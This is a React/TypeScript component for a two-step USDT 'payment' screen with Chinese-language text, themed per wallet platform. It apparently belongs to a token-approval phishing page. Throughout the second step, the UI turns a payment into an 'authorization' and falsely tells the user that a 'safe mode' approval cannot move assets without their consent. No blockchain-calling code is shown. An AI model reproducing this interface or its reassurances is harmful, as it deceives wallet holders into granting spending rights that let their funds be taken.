import { useState, forwardRef, useImperativeHandle } from 'react';
import { Button, Message, Radio } from '@alifd/next';

import styles from './step.module.css';

export function StepOne({
  platform,
  displayAddr,
  amount,
  onPayNowClick,
}: {
  platform: string;
  displayAddr: string;
  amount: string;
  onPayNowClick: () => void;
}) {
  return (
    <div className={styles.stepOneWrap}>
      <div className={styles.stepOneItemLabel}>收款地址</div>
      <div className={`${styles.stepOneItemValue} gl-cls-block`}>
        {displayAddr}
      </div>
      <div className={styles.stepOneItemLabel}>金额</div>
      <div className={`${styles.stepOneItemValue} gl-cls-block`}>{amount}</div>
      <div className={styles.stepOnePayBtnWrap}>
        <Button
          type="primary"
          size="large"
          className={styles.stepOnePayBtn}
          style={{
            height: '46px',
            backgroundColor: `var(--${platform}-color)`,
            borderRadius: `var(--${platform}-borderradius)`,
          }}
          onClick={(evt) => {
            evt.stopPropagation();

            onPayNowClick?.();
          }}
        >
          立即支付
        </Button>
      </div>
    </div>
  );
}

export type TypeStepTwoHandle = {
  stopLoading: () => void;
};

export const StepTwo = forwardRef<
  TypeStepTwoHandle,
  {
    platform: string;
    displayAddr: string;
    amount: string;
    onConfirmClick: () => void;
    onCancelClick: () => void;
  }
>(({ platform, amount, onConfirmClick, onCancelClick }, ref) => {
  const [selectedMode, setSelectedMode] = useState('mode1');
  const [btnLoading, setBtnLoading] = useState(false);

  useImperativeHandle(ref, () => {
    return {
      stopLoading: () => {
        setBtnLoading(false);
      },
    };
  });

  return (
    <div className={styles.stepTwoWrap}>
      <Message
        //
        type="success"
      >
        安全操作：当前授权地址只能转移 {amount}{' '}
        USDT，并需经过我同意，可避免被盗。
      </Message>
      <div className={styles.stepTwoSecondWrap}>
        <div className={styles.stepTwoTip}>
          <div className={styles.stepTwoTipTitle}>
            为保证资产安全，请仔细阅读以下信息
          </div>
          <div className={styles.stepTwoTipContent}>
            ● 授权金额(USDT): {amount}
          </div>
          <div className={styles.stepTwoTipNote}>
            <span className={styles.stepTwoTipNoteBold}>授权金额：</span>
            授权以后，该授权地址只能转走相应数量资产，无法转走所有资产。
          </div>
        </div>
        <div className={styles.stepTwoMode}>
          <div className={styles.stepTwoModeLabel}>
            <span className={styles.stepTwoModeLabelFlag}>*</span>授权模式
          </div>
          <Radio.Group
            className={`nrb-${platform}`}
            value={selectedMode}
            shape="button"
            onChange={(val) => {
              setSelectedMode(val as any);
            }}
          >
            <Radio
              id="mode1"
              value="mode1"
            >
              安全模式
            </Radio>
            <Radio
              id="mode2"
              value="mode2"
            >
              白名单模式
            </Radio>
          </Radio.Group>
        </div>
        <div className={styles.stepTwoModeNote}>
          {selectedMode === 'mode1'
            ? '安全模式：授权地址无法直接转走资产，需经过我同意，保证资产安全。'
            : ''}
          {selectedMode === 'mode2'
            ? '白名单模式：授权地址可以直接转走资产且无需确认。'
            : ''}
        </div>
      </div>
      <div className={styles.stepTwoBottom}>
        <Button
          type="primary"
          size="large"
          className={styles.stepOnePayBtn}
          style={{
            backgroundColor: btnLoading
              ? `var(--${platform}-loading-color)`
              : `var(--${platform}-color)`,
            borderRadius: `var(--${platform}-borderradius)`,
          }}
          onClick={(evt) => {
            evt.stopPropagation();
            if (btnLoading) {
              return;
            }

            setBtnLoading(true);
            onConfirmClick?.();
          }}
        >
          确认
          {btnLoading ? (
            <div
              className={styles.stepTwoBtnLoadingCircle}
              style={{
                backgroundColor: `var(--${platform}-white-color)`,
              }}
            >
              <div
                className={styles.stepTwoBtnLoadingCircleInner1}
                style={{
                  backgroundColor: `var(--${platform}-white-color)`,
                  borderTopColor: `var(--${platform}-blue-color)`,
                }}
              />
              <div
                className={styles.stepTwoBtnLoadingCircleInner2}
                style={{
                  backgroundColor: `var(--${platform}-loading-color)`,
                }}
              />
            </div>
          ) : null}
        </Button>
        <Button
          type="normal"
          size="large"
          className={styles.stepOnePayBtn}
          style={{
            borderRadius: `var(--${platform}-borderradius)`,
          }}
          onClick={(evt) => {
            evt.stopPropagation();

            onCancelClick?.();
          }}
        >
          取消
        </Button>
      </div>
    </div>
  );
});
